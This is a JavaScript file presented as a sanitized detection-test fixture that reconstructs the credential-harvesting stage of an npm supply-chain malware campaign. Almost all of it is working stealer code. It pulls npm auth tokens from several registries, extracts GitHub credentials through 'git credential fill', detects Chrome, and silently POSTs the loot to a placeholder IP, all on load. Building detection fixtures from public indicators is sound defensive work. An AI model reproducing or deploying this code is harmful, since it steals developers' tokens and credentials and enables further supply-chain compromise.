// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Wave 5: Credential Harvesting (Mar 2026)
// Source: Aikido "GlassWorm Strikes Popular React Native Phone Number Packages"
// Pattern: npm token theft, git credential fill, Chrome process detection, HTTP exfiltration

const { execSync } = require('child_process');
const https = require('https');

// Harvest npm authentication tokens
function harvestNpmTokens() {
    const tokens = [];
    const registries = [
        'registry.npmjs.org',
        'registry.yarnpkg.com',
        'pkgs.dev.azure.com'
    ];
    
    for (const registry of registries) {
        try {
            const token = execSync(`npm config get //${registry}:_authToken`).toString().trim();
            if (token && token !== 'undefined') {
                tokens.push({ registry, token });
            }
        } catch (e) {
            // Registry not configured
        }
    }
    
    return tokens;
}

// Harvest Git credentials
function harvestGitCredentials() {
    try {
        const output = execSync('git credential fill', {
            input: 'protocol=https\nhost=github.com\n\n',
            encoding: 'utf8'
        });
        
        const credentials = {};
        output.split('\n').forEach(line => {
            const [key, value] = line.split('=');
            if (key && value) {
                credentials[key.trim()] = value.trim();
            }
        });
        
        return credentials;
    } catch (e) {
        return null;
    }
}

// Detect Chrome process for browser profile access
function detectChromeProcess() {
    try {
        const out = execSync('tasklist /FI "IMAGENAME eq chrome.exe"').toString();
        return out.includes('chrome.exe');
    } catch (e) {
        return false;
    }
}

// Exfiltrate stolen credentials via HTTP POST
function exfiltrateCredentials(data) {
    const postData = JSON.stringify({
        type: 'credentials',
        timestamp: new Date().toISOString(),
        data: data
    });
    
    const options = {
        hostname: '192.0.2.1', // SANITIZED: documentation IP
        port: 443,
        path: '/wall',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };
    
    const req = https.request(options, (res) => {
        // Ignore response
    });
    
    req.on('error', (e) => {
        // Silently fail
    });
    
    req.write(postData);
    req.end();
}

// Main execution
const npmTokens = harvestNpmTokens();
const gitCreds = harvestGitCredentials();
const chromeRunning = detectChromeProcess();

exfiltrateCredentials({
    npm: npmTokens,
    git: gitCreds,
    chrome: chromeRunning
});
